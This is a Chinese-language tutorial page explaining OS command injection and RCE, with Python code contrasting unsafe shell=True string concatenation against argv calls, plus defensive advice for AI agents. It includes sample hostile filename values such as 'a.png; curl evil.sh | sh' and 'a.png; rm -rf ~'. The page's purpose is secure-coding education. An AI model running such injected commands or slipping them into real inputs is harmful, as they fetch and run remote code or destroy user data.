命令注入 / 远程代码执行 (RCE)

Command Injection

🧸 回到小白版
📐定义⚙️原理🔤术语💻代码📊参数对比⚖️方案取舍🕳️常见坑☑️检查清单🎤面试追问🔗延伸阅读
📐 01 · 定义

命令注入（OS Command Injection，CWE-78）指应用把不可信输入拼接进操作系统命令并交给 shell 执行，攻击者通过 ;、|、&&、$() 等元字符追加任意命令，常直接导致远程代码执行（RCE）。它属于应用安全的注入类漏洞，是 OWASP Top 10「注入」的一部分。AI Agent 执行 shell 命令、处理文件名的场景尤其容易引入。

⚙️ 02 · 原理
  1. 1

    应用调用 system()、exec()、subprocess(shell=True) 等接口，把用户输入拼进命令字符串。

  2. 2

    shell 解析整个字符串，元字符被解释为命令分隔、管道或子命令替换。

  3. 3

    攻击者输入如 a.png; curl evil.sh | sh，后半段以应用进程的权限执行。

  4. 4

    即使不经过 shell，若把输入作为参数传给 git、tar 等程序，以 - 开头的值仍可能被当成选项（参数注入）。

  5. 5

    防御核心是不经过 shell：以参数数组调用程序，或改用语言原生库，再叠加白名单校验与最小权限。

🔤 03 · 术语
RCE (Remote Code Execution)
攻击者能在目标服务器上执行任意代码。
Shell 元字符 (Metacharacters)
; | & $ ` > < 等被 shell 赋予特殊含义的字符。
参数注入 (Argument Injection)
输入被目标程序当作命令行选项解析。
参数数组 (argv)
以列表形式传参，不经 shell 解析，每项都是单个参数。
CWE-78
MITRE 对 OS 命令注入弱点的编号。
💻 04 · 代码
危险与安全的调用方式python
import re, subprocess

filename = request_args["file"]   # 来自用户，如 "a.png; rm -rf ~"

# ❌ shell=True + 字符串拼接：分号后的命令会被执行
subprocess.run(f"convert {filename} out.jpg", shell=True)

# ✅ 先做白名单校验，再用参数列表调用，不经过 shell
if not re.fullmatch(r"[\w.-]{1,100}", filename) or filename.startswith("-"):
    raise ValueError("invalid filename")
subprocess.run(["convert", "--", filename, "out.jpg"],
               check=True, timeout=30)
# "--" 告诉多数程序其后都是位置参数，防止参数注入（需目标程序支持）

# ✅ 更好：能用库就别调命令行，如用 Pillow 处理图片
# from PIL import Image; Image.open(path).convert("RGB").save("out.jpg")

参数列表让输入始终是一个参数；白名单与 -- 进一步防止参数注入。request_args 为示意变量。

⚖️ 06 · 方案取舍

参数数组调用

优点从根本上避免 shell 解析

代价无法使用管道、通配等 shell 特性

适用必须调用外部程序时

语言原生库替代

优点无进程边界，无注入面

代价需寻找等价库

适用图片、压缩、网络等常见操作

转义（如 shlex.quote）

优点可保留 shell 特性

代价易遗漏，跨 shell 行为不一

适用确实需要 shell 的遗留代码

沙箱/容器隔离执行

优点限制成功攻击的影响

代价不修复漏洞本身

适用Agent 执行任意命令的场景

🕳️ 07 · 常见坑

  • ✗以为加引号包住输入就安全

    ✓引号可被闭合；使用参数数组而非字符串拼接

  • ✗用黑名单过滤 ; 和 |

    ✓黑名单易绕过（换行、$()、反引号），改用白名单与不经 shell

  • ✗忽视参数注入，输入以 - 开头

    ✓使用 -- 分隔并拒绝以 - 开头的值

  • ✗让 Agent 以高权限直接执行模型生成的命令

    ✓在沙箱中以最小权限运行，危险命令需人工确认

☑️ 08 · 检查清单
🎤 09 · 面试追问
为什么参数数组能防命令注入？

不启动 shell，操作系统直接以 argv 执行程序；每个元素原样作为一个参数，; | $() 等不会被解释，输入最多影响该参数本身。

参数数组之后还有什么风险？

参数注入：目标程序会把以 - 开头的值当选项（如 git 的 --upload-pack 可执行命令）。还要防路径遍历、程序本身的漏洞，并对输入做白名单。

AI Agent 场景如何降低命令注入风险？

工具设计为结构化参数而非任意 shell；执行环境隔离（容器、无网络或网络白名单）；命令白名单与人工审批；对外部内容（网页、文件）中的指令保持怀疑，防止提示注入诱导执行。
